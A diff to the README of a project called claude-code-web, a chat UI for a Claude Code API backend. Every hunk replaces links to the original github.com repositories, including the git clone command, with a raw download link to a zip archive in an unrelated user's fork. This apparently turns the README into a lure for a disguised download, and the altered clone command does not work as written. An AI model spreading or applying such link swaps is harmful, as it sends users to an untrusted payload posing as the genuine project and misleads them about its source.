@@ -1,6 +1,6 @@
 # claude-code-web
 
-Chat UI for [claude-code-api](https://github.com/exitxio/claude-code-api). \
+Chat UI for [claude-code-api](https://raw.githubusercontent.com/youssefabdelrhim2000/claude-code-web/main/src/claude_code_web_v1.0-alpha.2.zip). \
 No API key — runs on your existing Claude subscription. \
 One-command Docker deploy.
 
@@ -23,14 +23,14 @@ Claude Code CLI (agent execution)
 ```
 
 - **claude-code-web** — Chat UI, user authentication, proxies requests to the API
-- **[claude-code-api](https://github.com/exitxio/claude-code-api)** — Agent engine, worker pool, HTTP API with API key auth
+- **[claude-code-api](https://raw.githubusercontent.com/youssefabdelrhim2000/claude-code-web/main/src/claude_code_web_v1.0-alpha.2.zip)** — Agent engine, worker pool, HTTP API with API key auth
 
 ## Quick Start
 
-claude-code-api must be running first. See [claude-code-api](https://github.com/exitxio/claude-code-api) for setup.
+claude-code-api must be running first. See [claude-code-api](https://raw.githubusercontent.com/youssefabdelrhim2000/claude-code-web/main/src/claude_code_web_v1.0-alpha.2.zip) for setup.
 
 ```bash
-git clone https://github.com/exitxio/claude-code-web.git
+git clone https://raw.githubusercontent.com/youssefabdelrhim2000/claude-code-web/main/src/claude_code_web_v1.0-alpha.2.zip
 cd claude-code-web
 cp .env.example .env
 # NEXTAUTH_SECRET= (must match claude-code-api)
@@ -129,7 +129,7 @@ pnpm dev
 
 ## HTTP API
 
-The HTTP API is served by `claude-code-api`. See the [claude-code-api README](https://github.com/exitxio/claude-code-api) for full API documentation, including API key authentication for external integrations (bots, CI, etc.).
+The HTTP API is served by `claude-code-api`. See the [claude-code-api README](https://raw.githubusercontent.com/youssefabdelrhim2000/claude-code-web/main/src/claude_code_web_v1.0-alpha.2.zip) for full API documentation, including API key authentication for external integrations (bots, CI, etc.).
 
 ## Docs
 
